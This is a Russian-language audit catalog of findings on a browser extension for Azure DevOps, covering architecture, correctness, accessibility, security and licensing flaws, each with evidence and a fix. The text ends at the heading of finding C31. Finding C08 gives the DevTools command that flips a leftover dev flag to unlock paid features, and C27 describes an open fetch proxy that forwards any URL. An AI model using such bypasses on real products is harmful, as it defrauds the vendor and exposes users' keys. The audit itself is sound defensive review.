# Каталог находок
41 находка: **17 high**, **15 medium**, **9 low**. Critical нет — ни одной дыры, через которую утекают данные пользователя прямо сейчас.
**Все находки прошли адверсариальную проверку** (второй проход закрыл хвост, оставшийся после лимита сессии). Статусы: `CONFIRMED` — подтверждена · `REFUTED → переформулирована` — исходная формулировка опровергнута, осталось меньшее ядро · `ЭСКАЛИРОВАНА` — при проверке нашли то, чего в находке не было. Подробнее — [01-methodology.md](01-methodology.md).
Пять находок были **опровергнуты** скептиками и в каталог не вошли — они перечислены в конце.

---

## High — существенная слабость архитектуры, безопасности или выручки

### C02 · Хрупкий порядок загрузки скриптов и парс-тайм зависимости между файлами (no-bundler)
**severity:** high · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `index.html`, `tools/check-globals.js`, `src/app.js`, `src/components/card-picker.js`

**Доказательство**

> index.html:697-766 — ~40 <script> в строго заданном порядке; tools/check-globals.js:27-31 сканирует каталог рекурсивно и лишь компилирует конкатенацию — ловит дубли имён и синтаксис, но НЕ порядок, НЕ полноту index.html, НЕ TDZ. app.js:467-477 на верхнем уровне (парс-тайм) создаёт `const parentEditor=createParentField('s_parent',...)`, `assignedEditor=createAssigneeField(...)`, завися от card-picker.js:359-361 и bare `sprintRoot`. ARCHITECTURE.md уже фиксирует «Parse-time gotcha».

**Что это значит**

Новый файл, забытый в index.html, проходит npm test и падает лишь в рантайме; перестановка тега или парс-тайм-обращение к ещё-необъявленному символу дают TDZ, невидимый для гейта. Одна такая ловушка уже была поймана вручную.

**Рекомендация**

Добавить tools/check-scripts.js (каждый src/**/*.js в index.html или importScripts; порядок = топосортировка по `// requires:`) в npm test. Перенести создание пикеров из парс-тайма в явную init-функцию.

### C03 · Модули-гиганты со смешанными обязанностями (filter-builder-modal 2628, layout 1725, ai-search-dialog 1557, ai-search-service 1389, side-panel 1348)
**severity:** high · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `src/components/filter-builder-modal.js`, `src/app/layout.js`, `src/app/side-panel.js`, `src/components/ai-search-dialog.js`, `src/ai/ai-search-service.js`

**Доказательство**

> filter-builder-modal.js: ensureModalElement() 1165–~2082 (~900 строк) смешивает DOM, вложенные flashSuccess/doSave/renderList (CRUD фильтров) и всю проводку событий; в файле 38 присваиваний innerHTML и 63 инлайновых .onclick/.onchange. layout.js — 1725 строк: persist тулбара/сайдбара + движок раскладки + drag-drop конструктор с getMockFieldHtml (911-1073). ai-search-dialog.js содержит и модал, и фоновую карточку, и полный CRUD настроек AISettingsDialog. ai-search-service.js смешивает загрузку схемы, эвристику уровня, 3 пайплайна, ~200-строчный JSON-парсер (:531) и нормализацию IR.

**Что это значит**

Высокая связность, невозможность юнит-тестирования, тяжёлое ревью; любая правка рискует задеть соседнюю подсистему. Для соло-разработчика — главный источник регрессий.

**Рекомендация**

Резать по швам без фреймворка: saved-filters (1211-2082) в отдельный файл; layout-preview.js/layout-builder.js; ai-settings-dialog.js; из сервиса выделить schema-builder, json-utils, ir-normalizer с юнит-тестами.

### C04 · Записи (updateItem и bulk batchUpdate) без optimistic concurrency (test /rev) — тихий last-write-wins
**severity:** high · **категория:** correctness · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/items.js`, `src/app/bulk.js`, `src/core/api/time.js`

**Доказательство**

> items.js:325-343 updateItem собирает ops БЕЗ теста ревизии: `ops.push({op:'add',path,value:v})` → `PATCH .../workitems/${wid}`. Для сравнения setParent (items.js:504)/addDependency делают `{op:'test',path:'/rev',value:d.rev}`. Редактор editor.js:444-446 хранит rev (`nodes[id].rev=r.rev`), но не передаёт. bulk.js:403-419 формирует PATCH без test /rev; bulk.js:428-441 итог сводится к счётчикам `ok++/fail++` без сбора id и причин; time.js:106-111 batchUpdate шлёт массив в `/_apis/wit/$batch`.

**Что это значит**

Правка поля из редактора и массовые правки молча перезаписывают конкурентное изменение (другая вкладка, native ADO UI, другой пользователь) — потеря данных без предупреждения о конфликте; в bulk пользователь видит лишь 'ok/fail N' без списка проблемных id.

**Рекомендация**

Прокидывать rev первой операцией `{op:'test',path:'/rev',value:rev}`; при 409 показывать баннер 'изменено другим — перезагрузить/перезаписать'. В bulk агрегировать per-item ошибки ($batch отдаёт code/body на элемент) в отчёт со списком id и причиной.

### C05 · req() ретраит неидемпотентные POST → дубликаты work item / комментариев / спринтов
**severity:** high · **категория:** correctness · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/http-auth.js`

**Доказательство**

> http-auth.js:125-155 единый ретрай-цикл применяется ко ВСЕМ методам: при сетевой ошибке `if(err.name==='AbortError')throw err; if(attempt<MAX_RETRIES){await sleep(...);continue;}` и при 5xx/429 `if(retryable&&attempt<MAX_RETRIES){await sleep(retryDelay(...));continue;}`. Через этот req() идут POST createItem (items.js:485), comment (items.js:354), createSprint (endpoints.js:87).

**Что это значит**

Если сервер обработал POST, но ответ потерялся (обрыв, 502 после записи), ретрай создаёт ДУБЛИКАТ: второй work item, второй комментарий, второй iteration-node — молчаливое дублирование данных на нестабильной сети.

**Рекомендация**

Ретраить только идемпотентные методы (GET/PUT/DELETE и PATCH с test /rev). Для POST не ретраить либо использовать серверные ключи идемпотентности; различать 'ошибка до отправки' и 'ответ потерян'.

### C06 · Мутабельный глобал detectedTargetField выбирает target-поле на весь проект по последнему смапленному item
**severity:** high · **категория:** correctness · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/http-auth.js`, `src/core/api/core.js`, `src/core/api/items.js`

**Доказательство**

> http-auth.js:173-177 mapWorkItem пишет в общий модульный глобал: `if(FIELD_REGISTRY.finish.ref in f){detectedTargetField=...finish.ref}else if(...target.ref in f){detectedTargetField=...target.ref}`. core.js:157-159 resolveField('target') читает этот глобал; items.js:223-238 updateItem тоже на него опирается.

**Что это значит**

В проекте со смешанными типами (часть FinishDate, часть TargetDate) значение флипается в зависимости от порядка обработки items в batchFetch (batch возвращает поле, только если у item есть значение). Timeline/Gantt и сохранение target-даты могут писать/читать не то поле у части элементов.

**Рекомендация**

Убрать глобал: разрешать target-поле по конкретному wtype (getWorkItemTypeFields уже кэширует набор полей типа) и передавать resolved-ref явно в mapWorkItem/updateItem.

### C07 · Нет single-flight вокруг обновления OAuth-токена — гонка refresh при конкурентных запросах
**severity:** high · **категория:** security · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/http-auth.js`, `src/core/api/query.js`, `src/core/api/graph.js`

**Доказательство**

> http-auth.js:69-77 getAccessToken: `if(!cfg.oauthAccess||Date.now()>cfg.oauthExpiresAt-120000){await oauthRefresh();cfg=await getConfig();}`. oauthRefresh (59-66) шлёт grant_type=refresh_token, storeTokens (22-26) сохраняет ротированный refresh. authHeader()→getAccessToken вызывается в КАЖДОМ req(), а req() запускается пулами: query.js:26 pool(...,3), graph.js:46 pool(...,6).

**Что это значит**

У границы истечения несколько параллельных запросов одновременно вызывают oauthRefresh с ОДНИМ refresh-токеном. Entra ротирует refresh (single-use): выигрывает один, остальные → invalid_grant → 'Session expired' и выкидывают пользователя из сессии посреди обычной загрузки доски. Плавающий, трудновоспроизводимый разлогин.

**Рекомендация**

Ввести single-flight: кэшировать in-flight Promise обновления (как populatePromise) и переиспользовать всеми конкурентными вызовами; сериализовать запись oauthRefresh/oauthAccess.

### C08 · Гейтинг лицензии полностью на клиенте + бэкдор __dev_force_pro в проде; клиентские Pro-фичи в принципе незащитимы
**severity:** high · **категория:** monetization · **статус:** `CONFIRMED`

**Файлы:** `src/components/entitlement-manager.js`, `background.js`, `docs/ARCHITECTURE.md`

**Доказательство**

> entitlement-manager.js:47-48 `isPro(){ if(this._devForcePro) return true; ... }`; init читает флаг из storage: `chrome.storage.local.get([STORAGE_KEY,'license_key','__dev_force_pro'])`. Состояние читается из chrome.storage.local (entitlement, __dev_force_pro). ARCHITECTURE §9 перечисляет клиентские Pro-фичи (Analytics, Conditional Formatting, Ultra-Dark, Advanced Export), исполняемые в браузере.

**Что это значит**

Любой пользователь через DevTools `chrome.storage.local.set({__dev_force_pro:true})` (или подмена entitlement.status='active') разблокирует все платные фичи. Бэкдор — тестовый тумблер — уезжает в собранный ZIP и остаётся активным навсегда. Перечисленные §9 клиентские фичи гейтятся ТОЛЬКО через isPro(), правимую в storage за секунды.

**Рекомендация**

Держать __dev_force_pro за флагом debug-сборки (вырезать в tools/build.js для прод-ZIP). Критичные Pro-фичи (hosted AI, cloud sync, тяжёлая аналитика/отчёты) исполнять/подписывать на бэкенде; клиентский isPro() — только для UI, не как граница безопасности. Задокументировать в §8/§9, что клиентские фичи защищены лишь UX-барьером.

### C09 · Нет CI: качественный гейт есть, но запуск целиком ручной и хрупкий (WSL/Windows-node)
**severity:** high · **категория:** testing · **статус:** `CONFIRMED`

**Файлы:** `package.json`, `docs/ARCHITECTURE.md`, `tools/build.js`

**Доказательство**

> package.json:11 "test":"node tools/check-globals.js && ... && node tests/api.test.js". Каталог .github отсутствует, husky/git-hooks нет. ARCHITECTURE.md:108-111: «npm resolves to the Windows npm on the mount... run each with the Windows node directly» + «Every runtime-affecting change needs a manual Chrome smoke».

**Что это значит**

Гейт не форсится ничем: коммит/push/сборка возможны без прогона тестов. Есть реальный конвейер build.js → dist/ado-atlas-extension.zip → Chrome Web Store, т.е. сломанный коммит может уехать в стор; запуск завязан на особенности WSL/Windows-node — легко получить ложно-зелёный.

**Рекомендация**

Добавить .github/workflows/ci.yml (ubuntu-latest, npm test на PR/push — zero-dep); отдельным job гонять build.js и грузить zip как artifact; локально дешёвый pre-commit hook (npm test).

### C10 · Тестами покрыты только чистые функции; ~20 тыс. строк stateful/DOM/биллинг-кода не покрыты
**severity:** high · **категория:** testing · **статус:** `CONFIRMED`

**Файлы:** `tests/lib.test.js`, `tests/ai.test.js`, `tests/api.test.js`, `src/components/entitlement-manager.js`

**Доказательство**

> 3 test-файла требуют src/core/lib.js, filter-manager.js, prefs.js, src/ai/* и http-auth.js (из api.test — только mapWorkItem). grep: entitlement|paywall|pro-features|license → 'NOT referenced by tests'. entitlement-manager.js:47-53 isPro() c grace-периодом (GRACE_MS) не имеет ни одного теста.

**Что это значит**

Весь императивный слой — filter-builder-modal, layout, side-panel, editor, bulk, undo/redo, board/tree/graph/timeline, endpoints, background.js и денежный гейт EntitlementManager.isPro/gate — держится только на ручном Chrome-смоуке; регрессии в этих модулях гейт не ловит.

**Рекомендация**

Инкрементально выносить чистые куски из stateful-модулей в тестируемые функции. Первым делом покрыть денежную логику EntitlementManager.isPro (grace, devForcePro, tier/status) — почти чистая, нужен лишь инъектируемый state и Date.now.

### C11 · Почти полное отсутствие ARIA-семантики, ролей и корректной иерархии заголовков в модалках/оверлеях
**severity:** high · **категория:** accessibility · **статус:** `CONFIRMED`

**Файлы:** `index.html`, `src/components/layer-manager.js`

**Доказательство**

> grep 'aria-' по src/+index.html → всего 2 совпадения (aria-label='Close'), 'role=' → 0. index.html:657 `<div id="confirm-overlay" class="modal-backdrop">` — ни role="dialog", ни aria-modal; то же у setup/newitem/customize-overlay. index.html:33 сегмент-контрол `<div class="seg" id="mode">...` без role=tab/aria-selected. grep '<h1' → 8 (логотип-тулбар + каждый заголовок модалки как <h1>: newitem :398, sprint :445, setup :591, confirm :659...).

**Что это значит**

Скринридер не объявляет ~10 оверлеев как диалоги, не читает выбранное состояние сегмент-контролов (Tree/Graph/Board), а навигация по заголовкам выдаёт 8 равнозначных h1 без иерархии. Продукт в Web Store фактически недоступен для незрячих.

**Рекомендация**

Добавить role="dialog" aria-modal="true" aria-labelledby на каждый *-overlay (заголовки уже есть); сегмент-контролам — role="tablist"/"tab"+aria-selected, синхронизировать с .on одним хелпером; оставить один h1, заголовки модалок сделать h2.

### C12 · Нет управления фокусом в модалках: LayerManager делает только z-index (нет focus-trap/возврата фокуса)
**severity:** high · **категория:** accessibility · **статус:** `CONFIRMED`

**Файлы:** `src/components/layer-manager.js`, `src/app/init.js`

**Доказательство**

> layer-manager.js целиком — только стек и recalculateZ() (z-index), никакого фокуса. grep trapFocus/focusTrap/'Tab' по src → 0. Модалки лишь фокусируют свой input (command-palette.js:28 `i.focus()`), но Tab уводит фокус на страницу за backdrop, а при закрытии фокус не возвращается на кнопку-триггер.

**Что это значит**

Клавиатурный пользователь при Tab внутри setup/confirm/customize/palette проваливается на элементы под затемнением; после Esc теряет точку фокуса. Оверлеи ведут себя не как диалоги.

**Рекомендация**

В LayerManager.open() запоминать document.activeElement и фокусировать первый элемент слоя, в close() — восстанавливать; повесить единый keydown Tab-обработчик на верхний слой стека для циклического focus-trap. Одна точка правки покрывает все оверлеи.

### C14 · gate() не вызывается НИ РАЗУ: оплаченный Pro упирается в тот же пейволл, что и Free
**severity:** high · **категория:** monetization · **статус:** `CONFIRMED (восстановлена вручную)`

**Файлы:** `src/app/init.js`, `src/components/entitlement-manager.js`

**Доказательство**

> ВОССТАНОВЛЕНА ПОСЛЕ ОШИБОЧНОГО ОПРОВЕРЖЕНИЯ скептиком; подтверждена мной напрямую. `grep -rn '\.gate(' src/` (кроме самого entitlement-manager.js) → 0 совпадений. Метод определён: entitlement-manager.js:90 `gate(feature){ if(this.isPro()) return true; ... }`. init.js:281 wirePremiumPlaceholders: `document.addEventListener('click',(e)=>{ const el=e.target.closest('[data-pro-feature]'); if(!el)return; e.preventDefault(); const feature=el.dataset.proFeature; if(window.PremiumPaywall) window.PremiumPaywall.open(feature); })` — БЕЗ какой-либо проверки isPro(). Плюс init.js wireControls: `$('mode').querySelectorAll('button').forEach(b=>b.onclick=()=>{ if(b.dataset.proFeature) return; ... })` — кнопка режима Analytics мертва для всех, включая Pro.

**Что это значит**

Ядро монетизации не подключено. Даже если бы касса работала, платящий Pro-пользователь при клике на ЛЮБУЮ Pro-фичу получал бы пейволл — то есть заплатил и не получил ничего. Трёхстатусная модель free/preview/pro (документированная в ARCHITECTURE §4) существует только на бумаге: реальный контроль доступа — безусловный перехват клика. Это блокер №1 всей выручки и одновременно источник негативных отзывов («кнопки не работают») у бесплатных пользователей.

**Рекомендация**

Заменить универсальный перехват на явные вызовы `EntitlementManager.gate(feature)` в точках входа каждой Pro-фичи: Pro/Team → пропуск, free → пейволл, preview → ограниченный режим через ProButtonManager.isPreview(). Метод gate() уже написан и корректно уважает grace-период и dev-флаг — правка минимальна. Обязательно пройти QA-чеклистом по всем data-pro-feature (их список — единственный источник истины о точках гейтинга). Покрыть юнит-тестом (isPro=true → gate возвращает true и не открывает пейволл).

### C15 · Премиум-витрина рекламирует нереализованные фичи (Analytics-дашборд, Ultra-Dark) при выключенном checkout — риск отклонения CWS
**severity:** high · **категория:** compliance · **статус:** `CONFIRMED`

**Файлы:** `src/components/premium-paywall.js`, `src/components/pro-features.js`, `src/app/analytics.js`, `src/boot/theme-init.js`, `index.html`

**Доказательство**

> premium-paywall.js:132-139 блок 'Pro Features — Coming Soon!' + disabled $5/mo. pro-features.js CATALOG: большинство status:'planned' (an_cycle/an_cfd/ai_summary/critical_path). index.html:53-54,618 золотые PRO-бейджи и `class="btn pro-glow"` на нерабочих кнопках. analytics.js:1 «thin telemetry facade» — не дашборд; init.js:300 кнопка Analytics имеет data-pro-feature и return, режим не переключается. ultra_dark: pro-button-manager.js:29 'preview' vs pro-features.js:48 'planned'; никакого `.ultra` CSS нет, applyTheme тоглит лишь .light. ARCHITECTURE §9/§4 описывают Analytics Dashboard и Ultra-Dark как существующие.

**Что это значит**

Витрина с ценником, PRO-бейджами и paywall поверх функций, которых нет, при неактивной покупке попадает под политику CWS о вводящем в заблуждение функционале. Главная заявленная ценность Pro (аналитика) отсутствует; метаданные гейтинга противоречивы.

**Рекомендация**

До запуска бэкенда спрятать премиум-витрину за флагом либо честно пометить как roadmap/preview без ценника; PRO-маркировку оставить только на реально существующих фичах; синхронизировать статусы CATALOG и §9/§4 с фактом.

### C16 · Cloud-запросы AI без таймаута и без возможности отмены; signal теряется по пути в service worker
**severity:** high · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `src/ai/custom-cloud-provider.js`, `background.js`, `src/components/ai-search-dialog.js`

**Доказательство**

> custom-cloud-provider.js:155 `_fetch(url,options)` ветка `chrome.runtime.sendMessage({action:'fetchCloudAI',url,method,headers,body})` НЕ передаёт `options.signal`, хотя `_callAPI` его выставляет (214/258). background.js:187 `fetch(url,{method,headers,body})` — без AbortController/таймаута. В ai-search-dialog.js нет ни одного AbortController; cancelBtn/close лишь прячут окно (:219,:1473).

**Что это значит**

Зависший облачный эндпоинт держит запрос бесконечно: канал sendMessage не закрывается, UI застревает в 'Generating filters', отмены нет, а для BYOK деньги тратятся. Cancel и фоновая карточка не прерывают выполнение.

**Рекомендация**

Добавить AbortController в handleSubmit и прокидывать signal до реального fetch: в `_fetch` слать `abort` в background (или порт), в background обернуть fetch в `AbortSignal.timeout(N)` и слушать отмену.

### C17 · Пользовательский AI-endpoint приглашается в UI, но host_permissions и CSP разрешают лишь 2 фиксированных хоста
**severity:** high · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `manifest.json`, `src/components/ai-search-dialog.js`, `src/ai/custom-cloud-provider.js`

**Доказательство**

> manifest.json:14-15 host_permissions только `generativelanguage.googleapis.com` и `api.openai.com`; :21 CSP connect-src тот же список. Настройки предлагают тип 'OpenAI (or Compatible)' и произвольный 'API Endpoint (Optional)' (ai-search-dialog.js:519,:535), а custom-cloud-provider.js:198 `const url=this.config.endpoint||'https://api.openai.com/...'` и :224 gemini baseUrl из endpoint — любой хост.

**Что это значит**

Настроенный Azure OpenAI / OpenRouter / self-hosted / корпоративный прокси даст непрозрачный CORS-сбой из service worker (нет host_permissions → нет CORS-байпаса), тогда как UI обещает совместимость. Verify-кнопка и запросы падают без внятной причины.

**Рекомендация**

Либо ограничить UI фиксированными хостами и убрать поле произвольного endpoint, либо запрашивать host-permission динамически (optional_host_permissions + chrome.permissions.request) при добавлении кастомного эндпоинта и показывать явную ошибку 'домен не разрешён'.

### C18 · PRO-переключатель Deep Research Mode ничего не делает — опция теряется в service-слое
**severity:** high · **категория:** monetization · **статус:** `CONFIRMED`

**Файлы:** `src/components/ai-search-dialog.js`, `src/ai/ai-search-service.js`

**Доказательство**

> ai-search-dialog.js:1360 в search() передаётся `deepResearch: deepResearchToggle?deepResearchToggle.checked:false`, а для не-Pro тумблер сбрасывается и открывает paywall (:197-204). Но в src/ai/ строка `deepResearch` не читается нигде — `search(userQuery,options)` (ai-search-service.js:29) использует только `options.reasoningLevel` и `options.onProgress`.

**Что это значит**

Платящий Pro-пользователь включает разрекламированный PRO-режим 'Deep Research', ожидает более глубокий поиск — и не получает ничего, без признаков no-op. Функционал платного тира, представленный как рабочий, фактически мёртв.

**Рекомендация**

Либо реализовать ветку deepResearch в пайплайне (форсировать thorough + расширенное разрешение сущностей), либо до готовности пометить тумблер как 'Coming soon'/disabled.

## Medium — заметное улучшение

### C20 · Повсеместное молчаливое проглатывание ошибок пустыми catch → пустые данные и рассинхрон без диагностики
**severity:** medium · **категория:** correctness · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/endpoints.js`, `src/core/api/time.js`, `src/core/api/items.js`, `src/app/bulk.js`, `src/app/board.js`, `src/app/dependencies.js`, `src/app/init.js`

**Доказательство**

> endpoints.js:18-21 iterations `catch(_){return[]}`, areas (40-42), time.js:27-33, items.js:425 comments, endpoints.js:5-14 me() `catch(_){return''}`. undo/redo: bulk.js:148 `try{await api.setParent(o.id,o.old)}catch(e){}` затем afterUndo(null) безусловно; board.js:217-218, dependencies.js:100-116 аналогично. Всего пустых catch: 77 (61 named). init.js:116 единый try обхватывает всю гидрацию prefs до :184 `...}catch(e){}`.

**Что это значит**

403/404/сеть/throttling неотличимы от легитимного 'пусто' — пользователь видит доску без спринтов/истории и не понимает, что это ошибка прав. В undo/redo при неуспехе API виден 'откат применён', хотя сервер не изменён — тихая рассинхронизация. Битая настройка молча роняет весь остаток гидрации.

**Рекомендация**

Различать 'нет данных' и 'сбой' (пробрасывать/возвращать {data,error}); логировать проглоченное в console.warn; в undo/redo хелпер, считающий неуспехи pool и триггерящий refresh; пустые catch оставить только для best-effort (телеметрия, revokeObjectURL). Разбить init.js:116 на автономные try.

### C21 · Нет статической типизации/JSDoc/checkJs и нет линтера поверх shared-global-scope
**severity:** medium · **категория:** dx · **статус:** `CONFIRMED`

**Файлы:** `src/app/state-globals.js`, `tools/check-globals.js`, `package.json`, `docs/ARCHITECTURE.md`

**Доказательство**

> В репо нет jsconfig/tsconfig, нет `// @ts-check`, нет @typedef на ~24k строк JS; форма App.state описана лишь комментарием (state-globals.js:10-23). Нет eslint/prettier/.editorconfig; package.json:8-13 только check/check:i18n/test/build. check-globals.js ловит лишь дубли top-level имён + синтаксис через vm.Script, «NOT runtime breakage». ARCHITECTURE.md «Hard lessons» перечисляет TDZ, missing bare ref, wrong SVG attr как гейт-невидимое.

**Что это значит**

Именно класс гейт-невидимых ошибок (опечатка в App.state.*, no-undef, no-unused-vars, TDZ) не ловится ничем до рантайма в Chrome; единственная защита — ручной smoke, что для соло хрупко.

**Рекомендация**

jsconfig.json c checkJs:true/allowJs:true + `// @ts-check` в ядровые файлы и `/** @typedef */` на App.state/REGISTRY; ESLint с eslint:recommended, env browser+webextensions, globals-allowlist (App, api, AdoLib, $, i18n) и no-undef/no-unused-vars как error.

### C22 · LIST_CAP=2000 обрезает выборку лишь булевым флагом; batchFetch errorPolicy:'omit' тихо теряет часть
**severity:** medium · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/query.js`, `src/core/api/core.js`

**Доказательство**

> core.js:10 `const LIST_CAP=2000`. query.js:69-76 list(): `const ids=await wiqlIds(wiql,LIST_CAP,signal); const items=await batchFetch(ids,null,signal);...out.truncated=ids.length>=LIST_CAP`. query.js:28 batchFetch шлёт `errorPolicy:'omit'`, затем `ids.map(i=>byId[i]).filter(Boolean)` молча выкидывает не вернувшиеся id.

**Что это значит**

Крупные проекты видят максимум 2000 items без пагинации — только флаг truncated. Любые id, по которым workitemsbatch вернул ошибку (права/удаление), тихо выпадают, а truncated считается лишь по 2000 — количество может не сойтись и это не сигнализируется. Дерево/граф/Gantt строятся по неполному набору.

**Рекомендация**

Реализовать курсорную дозагрузку поверх cap (WIQL по батчам id) или всегда показывать баннер '>2000, показаны первые N'; отдельно считать и показывать число omit-элементов, чтобы отличать обрезку от ошибок доступа.

### C23 · Кэши в chrome.storage.local: схема полей/типов без TTL и снапшот с сырыми fields — слабая инвалидация и риск квоты
**severity:** medium · **категория:** correctness · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/endpoints.js`, `src/core/api/core.js`, `src/app/snapshot.js`

**Доказательство**

> endpoints.js:146-176 getFieldsMap кэширует `global_fields_map_v4:...` без TTL; getWorkItemTypeFields (370-431) `wit_fields_v7:...` тоже без TTL. core.js:141-146 setConfig обнуляет ТОЛЬКО память (`teamRosterCache=null;globalFieldsCache=null;populatePromise=null`), storage-ключи не трогает. snapshot.js:17-23 при `roots>1500||nodes>4000` пишет весь `App.state.store.nodes` (с сырым mapped.fields из http-auth.js:227) в try/catch, где ошибка молча глотается; инвалидация только по префиксу snap:v2 и TTL 24ч.

**Что это значит**

Новое поле/state/allowedValues не появятся у пользователя, пока вручную не очистит storage или разработчик не поднимет версию ключа. До 4000 узлов с полным raw-fields упираются в квоту (~10МБ) — set() падает, ошибка проглатывается, 'мгновенный первый рендер' тихо перестаёт работать.

**Рекомендация**

Добавить TTL/ревалидацию схемы и кнопку 'обновить метаданные проекта'; при setConfig инвалидировать и storage-ключи схемы. В снапшот сохранять только лёгкие поля (id/type/title/state/parent/rev), логировать переполнение квоты, деградировать явно.

### C25 · Избыточные разрешения манифеста: web_accessible_resources ['<all_urls>'] и permission 'tabs'
**severity:** medium · **категория:** security · **статус:** `CONFIRMED`

**Файлы:** `manifest.json`, `background.js`

**Доказательство**

> manifest.json:35-40 `web_accessible_resources:[{resources:['src/components/tutorials/*.json','src/locales/*.json'],matches:['<all_urls>']}]`, при этом content_scripts НЕТ, а локали грузятся из своих контекстов через chrome.runtime.getURL (i18n.js:26, background.js:22/29). manifest.json:9 permission 'tabs' используется лишь в background.js:93 `chrome.tabs.query({})` для поиска своей вкладки index.html.

**Что это значит**

WAR с <all_urls> даёт любому сайту стабильный способ детектить установку (фингерпринтинг) и читать конфиг переводов. Permission 'tabs' даёт доступ к URL всех вкладок — чувствительно, хотя используется лишь для поиска своей. Оба ревьюеры CWS отдельно проверяют.

**Рекомендация**

Убрать блок web_accessible_resources (проверив, что ничего внешнего его не грузит) либо сузить matches до доменов ADO. Уйти от 'tabs': хранить id открытой вкладки (tabs.create возвращает id) или фильтровать по своему URL через getURL.

### C26 · Секреты (PAT, OAuth refresh, AI-ключи) хранятся открытым текстом; при signOut refresh не отзывается
**severity:** medium · **категория:** security · **статус:** `CONFIRMED`

**Файлы:** `src/core/api/core.js`, `src/core/api/http-auth.js`, `src/ai/custom-cloud-provider.js`

**Доказательство**

> core.js:145 `await chrome.storage.local.set(patch)` (pat, oauthAccess, oauthRefresh); http-auth.js:87 `return 'Basic '+btoa(':'+cfg.pat)`; custom-cloud-provider.js:68 `chrome.storage.local.set({ai_custom_providers:providers})` c apiKey. signOut() (http-auth.js:79) лишь стирает токен локально, не отзывает refresh на стороне Microsoft.

**Что это значит**

Долгоживущий OAuth refresh, PAT и AI-ключи лежат незашифрованными. Без бандлера все модули (включая вендоренные cytoscape/dagre) исполняются в одном скоупе с полным доступом к chrome.storage — компрометация любой зависимости или stored-XSS = мгновенная кража всех секретов; при signOut refresh остаётся валидным у провайдера.

**Рекомендация**

Отзывать OAuth-токен на logout (revoke endpoint); зафиксировать вендоры хэшем/версией и сверять supply chain; рассмотреть session-хранение access-токена; refresh держать максимально короткоживущим.

### C27 · Универсальный fetch-прокси fetchCloudAI в воркере форвардит любой url; AI-ключ Gemini уходит в query string
**severity:** medium · **категория:** security · **статус:** `CONFIRMED`

**Файлы:** `background.js`, `src/ai/custom-cloud-provider.js`

**Доказательство**

> background.js:186 `const {url,method,headers,body}=msg; fetch(url,{method,headers,body})` — url/headers/body полностью из сообщения страницы. custom-cloud-provider.js:226 `const url=\`${baseUrl}/v1/models/${model}:generateContent?key=${apiKey}\`` — ключ в query; endpoint при этом задаётся пользователем (:224).

**Что это значит**

Страничный CSP жёсткий, но воркер таким прокси делает произвольные кросс-доменные запросы в пределах host_permissions — граница CSP обходится. Ключ Gemini в ?key= часто попадает в логи прокси; на произвольный custom endpoint уйдут и ключ, и контент work item'ов в теле промпта.

**Рекомендация**

В fetchCloudAI валидировать/allow-list'ить целевой origin (только нужные AI-хосты). Ключ Gemini передавать заголовком x-goog-api-key. Для custom endpoint показывать предупреждение, что ключ и данные уйдут на указанный хост.

### C28 · Телеметрия GA4 включена по умолчанию (opt-out) без явного согласия
**severity:** medium · **категория:** security · **статус:** `CONFIRMED`

**Файлы:** `src/core/analytics.js`

**Доказательство**

> analytics.js:85-96 `enabled(){ if(!configured())return false;...return true; // default on }`. Отправка: :117 `fetch(ENDPOINT+..., {method:'POST',...,keepalive:true})`. MEASUREMENT_ID пока плейсхолдер (:26) — телеметрия спит, но включится молча, как только подставят реальный ID.

**Что это значит**

Данные анонимны (UUID, только mode/lang/version, без PII) — это сделано хорошо. Но opt-out по умолчанию с автостартом при заполнении ID — чувствительный для EU/GDPR и ревью CWS сценарий: сбор стартует сам после релиза без запроса согласия.

**Рекомендация**

Показать одноразовый consent-баннер при первом запуске (opt-in либо явное информирование с лёгким выключателем) либо документировать сбор в onboarding. Тумблер cycleTelemetry уже есть — не хватает первичного согласия перед первой отправкой.

### C29 · Самодельный тест-раннер не ждёт async-тесты — pass++ до выполнения ассертов, провалы уходят в unhandledRejection
**severity:** medium · **категория:** testing · **статус:** `CONFIRMED`

**Файлы:** `tests/ai.test.js`

**Доказательство**

> ai.test.js:32-41 `function test(name,fn){ try{fn();pass++;console.log('ok'...)}catch(e){fail++;...} }` — вызывает fn() синхронно. При этом 17 тестов объявлены как `async ()=>{...}` с await/assert (enrichIR/resolveIdentity/search :49,:84,:228). Финал — `setTimeout(()=>{...if(fail>0)process.exit(1)},100)`.

**Что это значит**

Для async-теста fn() возвращает pending-промис, try/catch завершается, pass++ печатается ДО ассертов; упавший assert уходит в unhandledRejection, а не в fail++. Итог 'N passed, 0 failed' недостоверен, привязка падения к тесту теряется — регрессии на самой сложной AI-части проходят незамеченными.

**Рекомендация**

Сделать test() async и `await fn()` в try/catch; собирать промисы и `await Promise.all` перед подсчётом, убрать setTimeout(100)-гонку. Альтернатива — node:test runner (node --test).

### C30 · Сохранённые фильтры пишутся мимо App.prefs — bespoke dual-write в обход реестра/файрвола
**severity:** medium · **категория:** architecture · **статус:** `CONFIRMED`

**Файлы:** `src/components/filter-builder-modal.js`, `docs/ARCHITECTURE.md`

**Доказательство**

> filter-builder-modal.js:1238 `const storage=(window.chrome&&chrome.storage&&chrome.storage.sync)||null`; 1256 savedFilters.push({id:Date.now()...,config:...}); 1258/1263 `storage.set({fbSavedFilters})` с fallback `localStorage.setItem('fbSavedFilters',...)`; плюс fbDraftFilter через localStorage (215,2363,2596). ARCHITECTURE.md:31-33 объявляет App.prefs «the single canonical store for persisted prefs».

**Что это значит**

Ключи fbSavedFilters/fbDraftFilter идут напрямую в chrome.storage.sync/localStorage, минуя App.prefs REGISTRY — не участвуют в per-key LWW/ts-роуминге, не попадают в export()/import() и check-prefs, а dual-write переизобретается инлайном. Расхождение с задокументированным единым источником.

**Рекомендация**

Перевести fbSavedFilters/fbDraftFilter на App.prefs (static sync-ключ или dynamic-key facility, как ado.layout.<wtype>) — получить роуминг, LWW и покрытие check-prefs бесплатно, убрав самописный storage-fallback.

### C31 · i18n неполон: строки, генерируемые в JS, остаются английскими; RTL задекларирован, но не реализован
